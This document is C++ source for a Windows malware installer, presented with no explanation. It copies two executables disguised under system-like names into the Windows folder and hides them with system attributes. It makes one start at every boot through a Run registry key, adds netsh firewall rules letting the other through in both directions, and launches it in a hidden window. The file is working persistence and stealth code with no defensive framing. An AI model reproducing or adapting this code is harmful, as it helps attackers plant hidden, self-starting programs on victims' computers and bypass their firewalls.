#include <fstream>
#include <windows.h>
#include <string>
using namespace std;

string path = string(getenv("SystemDrive")) + "\\Windows\\SysWow.exe";
string pathback = string(getenv("SystemDrive")) + "\\Windows\\csrrs.exe";

bool isVistaOrHigher() {
   OSVERSIONINFO osvi;
   ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
   GetVersionEx(&osvi);
   return osvi.dwMajorVersion >= 6;
}

int main()
{
    HKEY hKey;

    CopyFile("SysWow.exe", path.c_str(), false);
    CopyFile("csrrs.exe", pathback.c_str(), false);

    SetFileAttributes(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
    SetFileAttributes(pathback.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if(RegSetValueEx(hKey, "SysWow32" , 0 , REG_SZ ,(LPBYTE) pathback.c_str(), pathback.length()+1) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        RegSetValueEx(hKey , "SysWow32" , 0 , REG_SZ ,(LPBYTE) pathback.c_str(), pathback.length()+1);
    }
	RegCloseKey(hKey);

    if(isVistaOrHigher())
    {
        system(string("netsh advfirewall firewall add rule name=\"SysWow32\" dir=in action=allow program=\"" + path + "\" enable=yes").c_str());
        system(string("netsh advfirewall firewall add rule name=\"SysWow32\" dir=out action=allow program=\"" + path + "\" enable=yes").c_str());
    }
    else
    {
        system(string("netsh firewall add allowedprogram \""+path+"\" SysWow32 ENABLE").c_str());
    }

    ShellExecute(NULL, "open", pathback.c_str(), NULL, pathback.substr(0, pathback.length()-9).c_str(), SW_HIDE);
}

